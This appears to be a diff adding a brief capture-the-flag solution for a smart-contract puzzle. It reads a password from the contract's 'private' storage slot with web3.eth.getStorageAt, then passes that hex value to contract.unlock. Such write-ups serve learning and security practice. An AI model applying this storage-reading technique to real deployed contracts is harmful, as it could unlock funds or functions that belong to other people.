@@ -1,0 +1,7 @@
+1. use the web3.eth.getStorageAt("address", slotno)
+2. search for slot 1 (2nd 32 byte)
+3. This will be our password stored in "hex".
+
+4. Simply call
+
+await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
